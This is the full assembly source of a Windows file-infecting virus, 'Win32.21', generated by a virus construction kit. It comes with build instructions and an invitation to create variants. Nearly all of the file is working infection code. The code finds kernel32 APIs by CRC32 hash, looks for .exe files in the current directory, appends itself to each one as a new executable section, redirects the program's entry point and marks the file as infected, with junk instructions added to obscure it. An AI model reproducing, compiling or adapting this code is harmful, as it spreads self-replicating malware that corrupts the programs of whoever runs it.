              
;
;
; Win32.21 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.21
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 21
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 30
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov ebx, dword ptr [esp]
                                        ; add esp, 4
 add esp, 4d
 sub ebx, offset Delta
                                        ; mov ebp, ebx
 mov ebp, ebx
 jmp KernelSearchStart


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [eax]
                                        ; mov eax, ebx
 push ebx
 pop eax
                                        ; mov edi, eax
 push eax
 pop edi
 mov dword ptr [ebp+TempApisearch2], edi
 push ecx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+APICRC32]
 sub ebx, dword ptr [ecx]
 or ebx, ebx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ecx
 pop eax
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 add eax, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
                                        ; clear edx
 mov edx, 0
 xor eax, ecx                           ; Trash
 mov dx, word ptr [ebp+counter]
 shl eax, 2d                            ; Trash
                                        ; point to ordinal Table
 sal edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 xchg edx, eax
 movzx edx, word ptr [eax]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 mov edx, -3782d
 add edx, 3782d

 push edx
 push edx
 push 3h
 push edx
                                        ; add edx, 1
 add edx, 1d
 push edx
 push 80000000h or 40000000h
 lea edx, [ebp+WFD_szFileName]
 xchg esi, edx

 push esi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 mov ecx, -22680d
 add ecx, 22680d
 push ecx
 push ebx
 push ecx
                                        ; mov edx, 4
 push 4d
 pop edx
 push edx
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz CloseFile
                                        ; clear edx
 mov edx, -63219d
 add edx, 63219d
 push ebx
 push edx
 push edx
                                        ; mov ecx, 2
 mov ecx, ( 2d + 8d )
 sub ecx, 8d
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 mov edx, 25215794d                     ; Trash
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea edx, [ebp+WFD_nFileSizeLow]
 xchg edx, ebx

 cmp dword ptr [ebx], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov eax, dword ptr [ebp+MapAddress]
 shr edx, 25d                           ; Trash
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                        ; clear ebx
 mov ebx, 0
 or ebx, ebx
 jz Notagoodfile

Goodfile:
 and ecx, 67634544d                     ; Trash
 cmp word ptr [eax+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [eax+3Ch]
 pop ecx
                                        ; check if header lies inside the file
 cmp ecx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, 62871339d                     ; Trash
 add ecx, eax
                                        ; check for PE Header
                                        ; check for EP
 movzx edx, word ptr [ecx]
 xor edx, 'EP'
 jz Goodfile2
 mov ebx, ecx                           ; Trash
                                        ; clear edx
 mov edx, -48991d
 add edx, 48991d
 add edx, -1
 inc edx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], '21'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov dx, word ptr [ecx+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov bx, word ptr [ecx+16h]
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

 mov ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 mov ecx, 59084d
 sub ecx, 59084d
 add ecx, [ebx+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 inc ecx
 add ecx, 27d
                                        ; get ATableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
                                        ; get NTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
 xor edx, 30583484d                     ; Trash
                                        ; number of API's we're looking for
                                        ; clear edx
 mov edx, -58506d
 add edx, 58506d
 add edx, NumberOfApis

                                        ; load API Names and Offsets
 mov ecx, offset APINames
 add ecx, ebp

 lea eax, [ebp+APIOffsets]
 xchg eax, esi


GetApisLoop: 

                                        ; search 'em
                                        ; ecx points to the CRC
                                        ; esi points to the offset
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 call SearchAPI1
                                        ; add ecx, 4
 add ecx, 4d
 push dword ptr [ebp+TempAPI]
 pop ebx
 mov dword ptr [esi], -1
 and dword ptr [esi], ebx
                                        ; add esi, 4
 dec esi
 add esi, 5d
 sub edx, 1
 jnz GetApisLoop
                                        ; mov ebx, 1
 push 1d
 pop ebx
 lea ecx, [ebp+CheckSumMFA]
 xchg ecx, edi

 mov edx, offset XCheckSumMappedFile
 add edx, ebp

 mov esi, offset Imagehlp
 add esi, ebp

 call GetOtherApis
 jmp Outbreak



;        [ ///// * Retrieve non Kernel API's * \\\\\ ]

GetOtherApis:
 push edx 
 push esi
 call dword ptr [ebp+XLoadLibraryA]
 pop edx 
                                        ; mov esi, eax
                                        ; clear esi
 mov esi, 0
 add esi, eax
GetOtherApiLoop:
 push edx 
 push edi
 push esi
 call dword ptr [ebp+XGetProcAddress]
 pop edx 
 mov dword ptr [edx], eax
                                        ; add edx, 4
 add edx, 4d
 dec ebx
                                        ; add ebx, 1
 add ebx, 1d
 sub ebx, 1
 jz GetOtherApiEnd
GetOtherApiLoop2:
                                        ; add edi, 1
 sub edi, -1d
 cmp byte ptr [edi], 0
 jne GetOtherApiLoop2
                                        ; add edi, 1
 inc edi
 jmp GetOtherApiLoop
GetOtherApiEnd:
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop eax

 mov dword ptr [ebp+retEIP], eax

 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 dec ebp
 add ebp, 1
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 jmp ecx



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg edx, ecx

 push edx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret
 mov ebx, ecx                           ; Trash


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov esi, offset WFD_szFileName
 add esi, ebp

                                        ; mov ebx, 276
 push 276d
 pop ebx

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 add esi, 1d
 dec ebx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg esi, edx

 push esi
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret





;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov ebx, edi
                                        ; clear ebx
 sub ebx, ebx
 add ebx, edi
LenCRC:
                                        ; add ebx, 1
 inc ebx
 cmp byte ptr [ebx], 0
 jne LenCRC
 sub ebx, edi
                                        ; mov esi, ebx
                                        ; clear esi
 mov esi, -39128d
 add esi, 39128d
 add esi, ebx
                                        ; add esi, 1
 inc esi
 cld
                                        ; clear edx
 mov edx, 0
 add edx, -1
                                        ; mov eax, edx
 mov eax, edx
NextByteCRC:
                                        ; clear ebx
 mov ebx, 11943d
 sub ebx, 11943d
                                        ; clear ecx
 xor ecx, ecx
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 xor bl, dl
 mov dl, dh
 mov dh, al
 mov al, ah
 mov ah, 8
NextBitCRC:
 shr cx, 1
 rcr bx, 1
jnc NoCRC
 xor bx,08320h
 xor cx,0EDB8h
NoCRC:
 dec ah
jnz NextBitCRC
 xor edx, ebx
 xor eax, ecx
 dec esi
jnz NextByteCRC
 not eax
 not edx
 mov ebx, eax
 rol ebx, 16d
 mov bx, dx
 mov dword ptr [ebp+APICRC32], ebx
 popad
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 APICRC32    dd 0h
 CheckSum dd 0h
 XCheckSumMappedFile    dd 0h
 InfCounter  dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 PEheader    dd 0h
 sectionalign   dd 0h
 OTableVA    dd 0h

 APINames:
 dd 0797B49ECh           ; MapViewOfFile
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 08C892DDFh           ; CreateFileA
 dd 0FFC97C1Fh           ; GetProcAddress
 dd 0AA700106h           ; FindNextFileA
 dd 094524B42h           ; UnmapViewOfFile
 dd 04134D1ADh           ; LoadLibraryA
 dd 0C200BE21h           ; FindClose
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 068624A9Dh           ; CloseHandle

 filemask    db '*.Exe',0
 HeaderSum dd 0h
 FindHandle  dd 0h
 FileHandle  dd 0h
 AlignReg1   dd 0h
 KernelMZ    dd 0h
 counter     dw 0h
 MapAddress  dd 0h
 Imagehlp    db 'imagehlp.dll',0
 db 'Win32.21 of SnakeByte',0
 filealign   dd 0h
 NewSize     dd 0h
 OldBase     dd 400000h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 TempAPI     dd 0h
 MapHandle   dd 0h
 NTableVA    dd 0h
 OldEIP      dd 0h
 KernelPE    dd 0h
 CheckSumMFA db 'CheckSumMappedFile',0
 Misc1       dd 0h

 APIOffsets:
 XMapViewOfFile         dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileA           dd 0h
 XGetProcAddress        dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h
 XLoadLibraryA          dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h

 NewEIP      dd 0h
 TempApisearch2 dd 0h
 ATableVA    dd 0h
 AlignReg2   dd 0h





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov edx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edi, edx
 add edi, [edx+3Ch]
                                        ; get File Alignment
                                        ; add edi, 60
 add edi, 60d
 mov ecx, [edi]
 inc edi
 sub edi, 61d
 mov dword ptr [ebp+filealign], ecx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], edx
                                        ; get old Entrypoint
 mov ebx, dword ptr [edx+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], ebx
 mov ecx, dword ptr [edx+34h]
 mov dword ptr [ebp+OldBase], ecx
 mov eax, [edx+38h]
 mov dword ptr [ebp+sectionalign], eax
                                        ; Get last section
 mov eax, [edx+74h]
 shl eax, 3
                                        ; clear ecx
 xor ecx, ecx
 mov cx, word ptr [edx+6h]
 mov ebx, 28h
 pushad
 mov eax, ecx
 mul ebx
 mov dword ptr [ebp+Misc1], eax
 popad
 mov ecx, dword ptr [ebp+Misc1]
 add edx, 78h
 add edx, eax
 add edx, ecx
 lea eax, [ebp+newsection]
 xchg ebx, eax


 xchg ebx, edx
 push ebx
                                        ; Calculate the RVA of the new section
 mov edx, [ebx-5*8+8d]
 add edx, [ebx-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], edx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; mov eax, -1
 mov eax, ( -1d + 15d )
 sub eax, 15d
 and eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], eax
                                        ; calculate physical offset
 mov ecx,[ebx-5*8+20d]
 add ecx,[ebx-5*8+16d]
 mov eax,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], eax
 Call Align
                                        ; mov eax, -1
 mov eax, ( -1d + 0d )
 sub eax, 0d
 and eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], eax
                                        ; calculate new size
 mov ebx, dword ptr [ebp+filealign]
 mov edx, eax
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], ebx
 call Align
 sbb eax, 19d                           ; Trash
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 sar eax, 15d                           ; Trash
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
                                        ; mov ecx, 64
 push 64d
 pop ecx
 lea ebx, [ebp+newsection]
 xchg ebx, eax

 pop esi
WriteNewSectionLoop:
 mov dh, byte ptr [eax]
 mov byte ptr [esi], dh
                                        ; add esi, 1
 add esi, 1d
                                        ; add eax, 1
 add eax, 1d
 loop WriteNewSectionLoop
                                        ; increase section numbers
 mov ecx, dword ptr [ebp+PEheader]
 add word ptr [ecx+06h], 1
 push dword ptr [ebp+nsRVA]
 pop edx
 mov dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [ecx+28h], edx
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], -1d
 and dword ptr [ecx+4Ch], '21'
 mov eax, dword ptr [ebp+nsphysicaloffset]
 push eax
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize
 lea esi, [ebp+Virus]


AppendLoop:
 rep movsb
 cmp dword ptr [ebp+XCheckSumMappedFile], -1d
 je NoCheckSum
 lea edx, [ebp+CheckSum]
 xchg edx, ebx

 push ebx
 lea edx, [ebp+HeaderSum]
 xchg edx, eax

 push eax
 mov edx, dword ptr [ebp+NewSize]
 push edx
 mov edx, dword ptr [ebp+MapAddress]
 push edx
 call dword ptr [ebp+XCheckSumMappedFile]
 mov ebx, dword ptr [ebp+MapAddress]
 mov ebx, [ebx+3Ch]
 add ebx, dword ptr [ebp+MapAddress]
 sal eax, 21d                           ; Trash
                                        ; clear edx
 mov edx, 59324d
 sub edx, 59324d
 xor edx, dword ptr [ebp+CheckSum]
 mov dword ptr [ebx+58h], edx
NoCheckSum:
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop eax
 sub eax, 1
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 pop edx
 stc
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop eax
 push eax
                                        ; round to pages
 xor ax, ax
                                        ; add eax, 1
 add eax, 1d
GetKernelLoop:
                                        ; clear edx
 sub edx, edx
 sub eax, 1
 mov dx, word ptr [eax+03ch]
 cmp dx,0f800h
 je GetKernelLoop
 cmp eax, dword ptr [eax+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], eax
 mov edx, eax
 add edx, [eax+3Ch]
 mov [KernelPE+ebp], edx

 lea edx, GetApis
 add edx, ebp

 push edx
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop edx

 mov dword ptr [ebp+retEIP], edx

                                        ; clear esi
 and esi, 0
 add esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi

 and edx, 19629169d                     ; Trash



;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea esi, [ebp+filemask]
 xchg esi, eax

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 and edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 div ebx
                                        ; add eax, 1
 inc eax
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear edx
 and edx, 0
 push edx
 call ExitProcess



end FakeCode

